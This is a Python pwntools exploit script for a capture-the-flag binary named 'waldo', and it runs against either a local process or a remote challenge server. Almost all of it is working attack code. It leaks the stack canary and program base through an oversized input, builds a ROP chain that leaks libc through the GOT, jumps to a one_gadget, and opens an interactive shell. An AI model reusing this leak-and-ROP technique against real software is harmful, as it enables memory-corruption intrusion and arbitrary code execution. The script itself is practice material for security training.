#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./waldo"
elf=ELF(pwn_file)
base_address=0
canary=0
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc_address=0

if len(sys.argv)==1:
    conn=process(pwn_file)
    pid=conn.pid
else:
    context.proxy=(socks.SOCKS5,"10.211.55.2",1080)
    conn=remote("waldo.420blaze.in",420)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    log.debug("base address:0x%x"%base_address)
    log.debug("canary value:0x%x"%canary)
    log.debug("libc address:0x%x"%libc_address)
    pause()

def find_W():
    lines=[]
    conn.recvline()
    while True:
        data=conn.recvline(keepends=False)
        if not data:
            break
        lines.append(data)
    for i in range(len(lines)):
        j=lines[i].find("W")
        if j != -1:
            conn.sendlineafter("Where's Waldo? ","%d %d"%(i,j))
            conn.recvuntil("Waldone!\n")
            break



def find_base(data):
    idx=data.find("\x7f")+3
    base=u64(data[idx:idx+8])-0xc43
    can=u64(data[idx+17:idx+25])
    return base,can

conn.sendlineafter("? (y/N)","y")
conn.sendlineafter("Where's Waldo? ","-1 -1")
conn.sendlineafter("? (y/N)","y"+"a"*0x1000)
data=conn.recvuntil("Where's Waldo? ")
base_address,canary=find_base(data)
assert base_address&0xfff==0
assert canary&0xff==0
conn.sendline("-1 -1")
conn.sendlineafter("? (y/N)","y")

for i in range(0x20):
    find_W()

f={
    0x48:p64(canary),
    0x58:p64(base_address+0x1106),
    0x68:p64(0)+p64(1)+p64(elf.got["write"]+base_address)+p64(0x8)+p64(base_address+elf.got["read"])+p64(1)+p64(base_address+0x10f0),
    0xa8:p64(0)+p64(1)+p64(elf.got["read"]+base_address)+p64(0x100)+p64(0x202000+base_address)+p64(0)+p64(base_address+0x10f0),
    0xe8:p64(0)+p64(base_address+0x202000)+p64(0)*4+p64(0x109f+base_address),
}

conn.sendlineafter("Enter your name: ",fit(f,filler="\x00"))
conn.recvuntil("Congratz !\n")
libc_address=u64(conn.recv(8))-libc.symbols["read"]

f={
    0x8:p64(libc_address+0x4526a),    
}
conn.sendline(fit(f,filler="\x00",length=0x60))
conn.interactive()


